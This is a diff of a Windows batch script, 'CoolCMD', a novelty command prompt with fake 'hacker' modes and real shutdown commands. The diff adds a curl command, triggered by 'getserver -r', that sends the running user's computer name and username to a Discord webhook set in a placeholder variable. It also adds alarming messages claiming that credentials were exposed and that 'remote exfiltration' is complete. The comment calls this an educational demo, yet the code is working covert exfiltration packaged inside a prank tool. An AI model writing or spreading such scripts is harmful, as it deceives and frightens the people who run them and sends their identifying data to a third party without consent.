@@ -1,110 +1,98 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:: Set the webhook variable here for your demo
+set "WEBHOOK_URL=YOUR_DISCORD_WEBHOOK_HERE"
+
 :prompt_loop
 cls
-
-:: Display the current prompt (initially set to "Enter your command:")
+color 07
 echo CoolCMD
 echo And no, this is not affiliated with the Roblox c00lkid incident.
+echo.
 
-:: Prompt the user for input
-set /p userInput=CoolCMD:
+:input_top
+set /p userInput=CoolCMD: 
 
-:: Check the user's input and adjust the prompt accordingly
-if "!userInput!"=="devmode" (
-    goto hackerint
-) else (
-    echo "!userInput! is not a valid command."
-)
+:: Navigation Commands
+if /I "!userInput!"=="devmode" goto hackerint
+if /I "!userInput!"=="exit" exit
 
-if /I "!userInput!" EQU "shutdown -s" (
-    shutdown -s
-)
-
-if /I "!userInput!" EQU "shutdown -r" (
-    shutdown -r
-)
-
-if /I "!userInput!" EQU "shutdown -i" (
-    shutdown -i
-)
-
-if /I "!userInput!" EQU "shutdown -a" (
-    shutdown -a
-)
-
-if /I "!userInput!" EQU "shutdown -h" (
-    shutdown -h
-)
-
-if /I "!userInput!" EQU "shutdown -l" (
-    shutdown -l
-)
-
-if /I "!userInput!" EQU "help" (
+:: Shutdown Commands
+if /I "!userInput!"=="shutdown -s" shutdown -s
+if /I "!userInput!"=="shutdown -r" shutdown -r
+if /I "!userInput!"=="shutdown -i" shutdown -i
+if /I "!userInput!"=="shutdown -a" shutdown -a
+if /I "!userInput!"=="help" (
     echo ALL COMMANDS
-    echo help - You're looking at it
-    echo shutdown -l - Locks the computer
-    echo shutdown -h - Hibernates the computer
-    echo shutdown -a - Aborts a shutdown
-    echo shutdown -i - Interactive Shutdown GUI
+    echo help       - You're looking at it
+    echo devmode    - Enter Developer/Hacker mode
     echo shutdown -s - Shuts the computer down
     echo shutdown -r - Restarts the computer
+    echo exit       - Close CoolCMD
+    pause
+    goto prompt_loop
 )
 
+echo "!userInput!" is not a valid command.
+goto input_top
 
 :hackerint
 cls
-color A
-set /p userInput=devmode:
+color 0A
+echo [DEVELOPER MODE ACTIVE]
+:hacker_input
+set /p userInput=devmode: 
 
-if /I "!userInput!" EQU "getserver -r" (
-    tree
+if /I "!userInput!"=="getserver -r" (
     tree
     DRIVERQUERY
-    echo.
-    echo Scanning Vulnerable Servers
-    timeout 5
-    echo.
+    echo Scanning Vulnerable Servers...
+    timeout /t 3 >nul
     color 0C
-    echo WARNING: YOUR CREDIDENTIALS HAVE BEEN LEAKED.
-    start cmd /k ftp 192.168.110.27:21
+    echo WARNING: SYSTEM CREDENTIALS EXPOSED.
+    echo Sending system manifest to remote server...
+    
+    :: EDUCATIONAL EXFILTRATION DEMO
+    :: This sends the PC name and User to your webhook
+    curl -H "Content-Type: application/json" -d "{\"content\":\"**ALERT:** System Info Grabbed\n**PC:** %COMPUTERNAME%\n**User:** %USERNAME%\"}" %WEBHOOK_URL%
+    
     pause
     goto hackerint
 )
 
-if /I "!userInput!" EQU "exit" (
-    goto prompt_loop
-)
-
-if /I "!userInput!" EQU "destroy cooline" (
-    color 0C
-    echo ERROR: ACCESS DENIED
-    color A
-)
-
-if /I "!userInput!" EQU "SXCgtlogon" (
-    timeout 3
-    goto SXCgt
-)
+if /I "!userInput!"=="SXCgtlogon" goto SXCgt
+if /I "!userInput!"=="exit" goto prompt_loop
+goto hacker_input
 
 :SXCgt
 cls
-color B
-set /p userInput=SXCgtMode:
+color 0B
+echo -- SXCgt SECURE SHELL --
+:sxc_input
+set /p userInput=SXCgtMode: 
 
-if /I "!userInput!" EQU "destroy cooline" (
-echo Loading...
-tree
-dir /b /s > 2024-09-05T21_33_52_275Z-debug-0.txt
-goto kernalpanic
+if /I "!userInput!"=="destroy cooline" (
+    echo Loading...
+    tree
+    echo Generating debug log...
+    dir /b /s > debug_log.txt
+    goto kernalpanic
+) else (
+    color 0C
+    echo FATAL ERROR AT 000000XB0242. PLEASE REINSTALL COOLINE
+    timeout /t 3 >nul
+    goto prompt_loop
+)
 
 :kernalpanic
-set /p userInput=ERROR:
-) else (
-    echo "FATAL ERROR AT 000000XB0242. PLEASE REINSTALL COOLINE"
 cls
 color 0C
-echo FATAL SYSTEM ERROR
-timeout -1
+echo ========================================
+echo           FATAL SYSTEM ERROR
+echo ========================================
+echo KERNEL_STACK_INPAGE_ERROR (0x00000077)
+echo.
+echo Remote exfiltration complete.
+pause
+goto prompt_loop
